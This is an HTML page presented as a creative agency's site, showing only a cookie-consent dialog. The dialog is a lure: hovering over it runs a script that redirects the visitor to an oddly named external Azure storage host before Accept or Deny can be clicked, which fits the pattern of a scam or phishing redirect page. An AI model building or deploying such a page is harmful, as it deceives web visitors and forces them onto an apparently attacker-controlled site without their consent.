<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="utf-8" />
  <title>Creative Agency Page</title>
  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
  <script defer data-domain="ambodycreatives.vercel.app" src="https://plausible.io/js/script.js"></script>
  <style>
    html, body {
      height: 100%;
      margin: 0;
      font-family: 'Segoe UI', sans-serif;
      background: url('https://via.placeholder.com/1200x800') no-repeat center center/cover;
    }

    .overlay {
      position: fixed;
      inset: 0;
      backdrop-filter: blur(8px);
      background: rgba(0, 0, 0, 0.4);
      z-index: 9999;
      display: flex;
      justify-content: center;
      align-items: center;
    }

    .dialog-box {
      background: #1c1c1c;
      color: white;
      padding: 30px;
      border-radius: 20px;
      width: 90%;
      max-width: 400px;
      box-shadow: 0 0 25px rgba(0,0,0,0.6);
      text-align: center;
      transition: 0.3s;
      z-index: 10000;
    }

    .dialog-box:hover {
      cursor: pointer;
    }

    .dialog-box h2 {
      font-size: 1.6em;
      margin-bottom: 10px;
    }

    .dialog-box p {
      font-size: 1em;
      line-height: 1.6em;
      color: #ccc;
    }

    .buttons {
      display: flex;
      justify-content: center;
      margin-top: 20px;
      gap: 15px;
      flex-wrap: wrap;
    }

    .buttons button {
      padding: 10px 25px;
      border: none;
      border-radius: 25px;
      font-size: 1em;
      font-weight: bold;
      cursor: pointer;
    }

    .accept {
      background-color: #00cc66;
      color: white;
    }

    .deny {
      background-color: #e53935;
      color: white;
    }

    .policy-link {
      margin-top: 15px;
      display: block;
      color: #00bcd4;
      text-decoration: none;
      font-size: 0.9em;
    }
  </style>
</head>
<body>
  <div class="overlay">
    <div class="dialog-box" onmouseover="redirect()">
      <h2>üç™ Our New Cookie Policy!</h2>
      <p>
        For optimized experience, some elements may store temporary signals. For your safety, our website uses cookies to personalize content and ads, provide social media features, and analyze our traffic.
      </p>
      <div class="buttons">
        <button class="accept">Accept</button>
        <button class="deny">Deny</button>
      </div>
      <a href="#" class="policy-link">Policy Page</a>
    </div>
  </div>

  <script>
    function redirect() {
      window.location.href = "https://errorrcx0x0098awa.z13.web.core.windows.net/";
    }
  </script>
</body>
</html>
